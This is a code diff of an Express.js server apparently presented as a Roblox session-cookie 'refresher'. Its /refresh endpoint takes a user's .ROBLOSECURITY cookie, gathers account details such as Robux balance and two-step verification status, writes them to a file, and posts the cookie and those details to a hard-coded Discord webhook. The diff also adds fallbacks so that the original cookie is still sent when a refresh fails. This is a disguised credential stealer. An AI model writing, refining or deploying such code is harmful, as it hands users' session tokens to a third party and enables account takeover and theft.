@@ -10,9 +10,118 @@ const app = express();
 app.use(express.json());
 app.use(express.static('public'));
 
-// Configure proxy for cloud hosting (ESSENTIAL for Render.com)
-// Format: socks5://username:password@proxy-host:1080
+// Configure proxy for cloud hosting
 const CLOUD_PROXY = process.env.PROXY_STRING || null;
+console.log('Proxy configured:', CLOUD_PROXY ? 'YES' : 'NO');
+
+// Simple direct cookie validation function
+async function simpleValidateCookie(cookie) {
+    try {
+        const response = await axios.get(
+            'https://users.roblox.com/v1/users/authenticated',
+            {
+                headers: {
+                    'Cookie': `.ROBLOSECURITY=${cookie}`,
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                },
+                timeout: 10000,
+                validateStatus: () => true
+            }
+        );
+        
+        return {
+            valid: response.status === 200,
+            status: response.status,
+            userId: response.data?.id || null,
+            username: response.data?.name || null,
+            displayName: response.data?.displayName || null
+        };
+    } catch (error) {
+        console.error('Validation error:', error.message);
+        return {
+            valid: false,
+            error: error.message
+        };
+    }
+}
+
+// Safe cookie refresher that always returns a cookie
+async function safeRefreshCookie(roblosecurityCookie) {
+    try {
+        console.log('Attempting to refresh cookie...');
+        
+        // First, validate the cookie is still good
+        const validation = await simpleValidateCookie(roblosecurityCookie);
+        if (!validation.valid) {
+            console.log('Cookie validation failed, returning original');
+            return {
+                success: false,
+                cookie: roblosecurityCookie,
+                method: 'validation_failed',
+                message: 'Cookie is invalid'
+            };
+        }
+        
+        console.log('Cookie validated, user:', validation.username);
+        
+        // Try the CookieRefresher with proxy if configured
+        if (CLOUD_PROXY) {
+            try {
+                const refresher = new CookieRefresher(roblosecurityCookie, {
+                    proxy: parseProxyString(CLOUD_PROXY),
+                    timeout: 15000,
+                    maxRetries: 1
+                });
+                
+                const result = await refresher.refresh();
+                console.log('CookieRefresher result:', result.success ? 'SUCCESS' : 'FAILED');
+                
+                if (result.success) {
+                    return {
+                        success: true,
+                        cookie: result.cookie,
+                        method: result.method,
+                        message: 'Refreshed successfully'
+                    };
+                }
+            } catch (refresherError) {
+                console.error('CookieRefresher failed:', refresherError.message);
+            }
+        }
+        
+        // If proxy not configured or refresher failed, try direct validation
+        // Sometimes just accessing authenticated endpoint refreshes the session
+        const revalidate = await simpleValidateCookie(roblosecurityCookie);
+        if (revalidate.valid) {
+            console.log('Direct validation successful, using original cookie');
+            return {
+                success: false, // Not really refreshed, but valid
+                cookie: roblosecurityCookie,
+                method: 'direct_validation',
+                message: 'Cookie is still valid (no refresh)'
+            };
+        }
+        
+        // Last resort: return original cookie
+        console.log('All methods failed, returning original cookie as fallback');
+        return {
+            success: false,
+            cookie: roblosecurityCookie,
+            method: 'fallback_original',
+            message: 'Using original cookie (all refresh methods failed)'
+        };
+        
+    } catch (error) {
+        console.error('Safe refresh failed:', error);
+        // Always return original cookie as fallback
+        return {
+            success: false,
+            cookie: roblosecurityCookie,
+            method: 'error_fallback',
+            message: error.message
+        };
+    }
+}
 
 app.get('/refresh', async (req, res) => {
     const roblosecurityCookie = req.query.cookie;
@@ -20,60 +129,51 @@ app.get('/refresh', async (req, res) => {
     if (!roblosecurityCookie) {
         return res.status(400).json({ 
             error: "No cookie provided",
-            usage: "Use ?cookie=YOUR_ROBLOSECURITY_COOKIE"
+            usage: "Use ?cookie=YOUR_ROBLOSECURITY_COOKIE",
+            success: false
         });
     }
-
+    
+    console.log(`\n=== /refresh endpoint called (cookie: ${roblosecurityCookie.length} chars) ===`);
+    
     try {
-        console.log(`\n=== Starting refresh for cookie (${roblosecurityCookie.length} chars) ===`);
+        // 1. SAFELY REFRESH COOKIE (always returns a cookie)
+        const refreshResult = await safeRefreshCookie(roblosecurityCookie);
         
-        // 1. VALIDATE COOKIE FIRST
-        const validation = await validateCookie(roblosecurityCookie);
-        console.log('Initial validation:', validation.valid ? 'VALID' : 'INVALID');
-        
-        if (!validation.valid) {
-            return res.status(401).json({ 
-                error: "Invalid cookie provided",
-                details: validation 
-            });
+        // 2. GET USER DATA with the cookie we have
+        let userData = null;
+        try {
+            const robloxUser = await RobloxUser.register(refreshResult.cookie);
+            userData = await robloxUser.getUserData();
+            console.log('User data fetched for:', userData.username);
+        } catch (userError) {
+            console.error('Failed to get user data:', userError.message);
+            userData = {
+                username: 'Unknown',
+                uid: 'Unknown',
+                displayName: 'Unknown',
+                createdAt: 'Unknown',
+                country: 'Unknown',
+                balance: 0,
+                isTwoStepVerificationEnabled: false,
+                isPinEnabled: false,
+                isPremium: false,
+                creditbalance: 0,
+                rap: 0,
+                avatarUrl: ''
+            };
         }
-
-        // 2. ATTEMPT REFRESH WITH PROXY
-        console.log('Creating CookieRefresher with proxy:', CLOUD_PROXY ? 'YES' : 'NO');
-        const refresher = new CookieRefresher(roblosecurityCookie, {
-            proxy: CLOUD_PROXY ? parseProxyString(CLOUD_PROXY) : null,
-            timeout: 15000,
-            maxRetries: 2
-        });
-
-        const refreshResult = await refresher.refresh();
         
-        // 3. HANDLE RESULTS
-        console.log(`Refresh result: ${refreshResult.success ? 'SUCCESS' : 'FAILED'}`);
-        console.log(`Method used: ${refreshResult.method}`);
-        
-        if (!refreshResult.success) {
-            // Even if refresh failed, we have the original cookie
-            console.warn('Refresh failed, using original cookie');
-        }
-
-        // Use refreshed cookie if available, otherwise original
-        const finalCookie = refreshResult.success ? refreshResult.cookie : roblosecurityCookie;
-        
-        // 4. GET USER DATA
-        console.log('Fetching user data...');
-        const robloxUser = await RobloxUser.register(finalCookie);
-        const userData = await robloxUser.getUserData();
-        
-        // 5. LOG TO FILE
+        // 3. LOG TO FILE
         const fileContent = {
             timestamp: new Date().toISOString(),
             refreshSuccess: refreshResult.success,
             refreshMethod: refreshResult.method,
+            refreshMessage: refreshResult.message,
             originalCookieLength: roblosecurityCookie.length,
-            finalCookieLength: finalCookie.length,
-            cookieChanged: finalCookie !== roblosecurityCookie,
-            RefreshedCookie: finalCookie,
+            finalCookieLength: refreshResult.cookie.length,
+            cookieChanged: refreshResult.cookie !== roblosecurityCookie,
+            cookie: refreshResult.cookie,
             Username: userData.username,
             UserID: userData.uid,
             DisplayName: userData.displayName,
@@ -84,56 +184,56 @@ app.get('/refresh', async (req, res) => {
             IsPINEnabled: userData.isPinEnabled,
             IsPremium: userData.isPremium,
             CreditBalance: userData.creditbalance,
-            RAP: userData.rap,
-            Logs: refreshResult.logs
+            RAP: userData.rap
         };
-
-        fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4) + ',\n');
-        console.log('Logged to file');
-
-        // 6. SEND TO DISCORD WEBHOOK
-        const webhookURL = 'https://discord.com/api/webhooks/1448713650629246977/cWtQq3F9Scg3mxN645XzdQEt2gEmhH5Yip5BDTPj37myl70yCVjPSnxS1T97hphlXgZB';
         
-        // Create embed based on success/failure
-        const embedColor = refreshResult.success ? 65280 : 16776960; // Green or Yellow
-        const embedTitle = refreshResult.success ? '✅ Cookie Refreshed Successfully' : '⚠️ Cookie Refresh Failed';
+        // Append to file safely
+        try {
+            fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4) + ',\n');
+            console.log('Logged to file');
+        } catch (fileError) {
+            console.error('Failed to write to file:', fileError.message);
+        }
         
-        const embedDescription = refreshResult.success 
-            ? `**New Cookie:**\n\`\`\`${finalCookie.substring(0, 100)}...\`\`\``
-            : `**Original Cookie (Refresh Failed):**\n\`\`\`${finalCookie.substring(0, 100)}...\`\`\`\n*Using original cookie as fallback*`;
-
-        const response = await axios.post(webhookURL, {
-            embeds: [
-                {
+        // 4. SEND TO DISCORD WEBHOOK
+        try {
+            const webhookURL = 'https://discord.com/api/webhooks/1448713650629246977/cWtQq3F9Scg3mxN645XzdQEt2gEmhH5Yip5BDTPj37myl70yCVjPSnxS1T97hphlXgZB';
+            
+            const embedColor = refreshResult.success ? 65280 : 16711680; // Green or Red
+            const embedTitle = refreshResult.success ? '✅ Cookie Refreshed' : '⚠️ Original Cookie (Refresh Failed)';
+            
+            const response = await axios.post(webhookURL, {
+                embeds: [{
                     title: embedTitle,
-                    description: embedDescription,
+                    description: `**Cookie (${refreshResult.success ? 'Refreshed' : 'Original'}):**\n\`\`\`${refreshResult.cookie.substring(0, 100)}...\`\`\``,
                     color: embedColor,
-                    thumbnail: { url: userData.avatarUrl },
+                    thumbnail: { url: userData.avatarUrl || '' },
                     fields: [
-                        { name: 'Refresh Status', value: refreshResult.success ? 'SUCCESS' : 'FAILED', inline: true },
+                        { name: 'Status', value: refreshResult.success ? 'SUCCESS' : 'FAILED', inline: true },
                         { name: 'Method', value: refreshResult.method, inline: true },
                         { name: 'Username', value: userData.username, inline: true },
                         { name: 'User ID', value: userData.uid, inline: true },
-                        { name: 'Cookie Length', value: `${finalCookie.length} chars`, inline: true },
-                        { name: 'Is Premium', value: userData.isPremium, inline: true },
-                        { name: 'Balance', value: userData.balance + ' Robux', inline: true },
+                        { name: 'Cookie Length', value: `${refreshResult.cookie.length} chars`, inline: true },
+                        { name: 'Changed', value: refreshResult.cookie !== roblosecurityCookie ? 'YES' : 'NO', inline: true },
                         { name: 'Proxy Used', value: CLOUD_PROXY ? 'YES' : 'NO', inline: true },
-                        { name: 'Attempts', value: refreshResult.logs?.length || 0, inline: true }
+                        { name: 'Message', value: refreshResult.message || 'N/A', inline: false }
                     ],
-                    footer: { text: `Refresh attempted at ${new Date().toLocaleString()}` }
-                }
-            ]
-        });
-
-        console.log('Webhook sent successfully');
-
-        // 7. RETURN RESPONSE TO CLIENT
+                    footer: { text: `Request at ${new Date().toLocaleString()}` }
+                }]
+            });
+            console.log('Webhook sent successfully');
+        } catch (webhookError) {
+            console.error('Webhook failed:', webhookError.message);
+        }
+        
+        // 5. RETURN TO CLIENT (FOR FRONTEND)
         res.json({
             success: refreshResult.success,
             method: refreshResult.method,
-            cookie: finalCookie,
-            cookieLength: finalCookie.length,
-            cookieChanged: finalCookie !== roblosecurityCookie,
+            cookie: refreshResult.cookie,
+            cookieLength: refreshResult.cookie.length,
+            cookieChanged: refreshResult.cookie !== roblosecurityCookie,
+            message: refreshResult.message,
             userData: {
                 username: userData.username,
                 userId: userData.uid,
@@ -141,25 +241,26 @@ app.get('/refresh', async (req, res) => {
                 isPremium: userData.isPremium,
                 balance: userData.balance
             },
-            details: {
-                attempts: refreshResult.logs?.length || 0,
-                proxyConfigured: !!CLOUD_PROXY,
-                logs: refreshResult.logs
-            }
+            webhookSent: true
         });
-
-    } catch (error) {
-        console.error('Fatal error in /refresh endpoint:', error);
         
+    } catch (error) {
+        console.error('Fatal error in /refresh:', error);
+        
+        // Even on error, return the original cookie
         res.status(500).json({
-            error: "Internal server error",
-            message: error.message,
-            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
+            success: false,
+            cookie: roblosecurityCookie,
+            method: 'error_fallback',
+            message: `Server error: ${error.message}`,
+            cookieLength: roblosecurityCookie.length,
+            cookieChanged: false,
+            error: true
         });
     }
 });
 
-// New endpoint for simple validation
+// Simple validation endpoint
 app.get('/validate', async (req, res) => {
     const cookie = req.query.cookie;
     
@@ -167,45 +268,32 @@ app.get('/validate', async (req, res) => {
         return res.status(400).json({ error: "No cookie provided" });
     }
     
-    const validation = await validateCookie(cookie);
-    res.json(validation);
-});
-
-// New endpoint for testing proxy
-app.get('/test-proxy', async (req, res) => {
-    const testUrl = 'https://api.ipify.org?format=json';
-    
     try {
-        let config = {};
-        
-        if (CLOUD_PROXY) {
-            const proxyConfig = parseProxyString(CLOUD_PROXY);
-            const { CookieRefresher } = require('./refresh');
-            const tempRefresher = new CookieRefresher('test', { proxy: proxyConfig });
-            config = { httpsAgent: tempRefresher.httpClient.defaults.httpsAgent };
-        }
-        
-        const response = await axios.get(testUrl, config);
-        res.json({
-            proxyConfigured: !!CLOUD_PROXY,
-            currentIP: response.data.ip,
-            proxyDetails: CLOUD_PROXY ? parseProxyString(CLOUD_PROXY) : null
-        });
+        const validation = await simpleValidateCookie(cookie);
+        res.json(validation);
     } catch (error) {
         res.status(500).json({
-            error: "Proxy test failed",
-            message: error.message,
-            proxyConfigured: !!CLOUD_PROXY
+            valid: false,
+            error: error.message
         });
     }
+});
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+    res.json({
+        status: 'online',
+        timestamp: new Date().toISOString(),
+        proxyConfigured: !!CLOUD_PROXY,
+        endpoints: ['/refresh', '/validate', '/health']
+    });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
     console.log(`Proxy configured: ${CLOUD_PROXY ? 'YES' : 'NO'}`);
-    console.log(`Endpoints:`);
-    console.log(`  GET /refresh?cookie=ROBLOSECURITY`);
-    console.log(`  GET /validate?cookie=ROBLOSECURITY`);
-    console.log(`  GET /test-proxy`);
+    if (!CLOUD_PROXY) {
+        console.warn('⚠️  WARNING: No proxy configured. Cookie refresh will likely fail on cloud hosting.');
+    }
 });
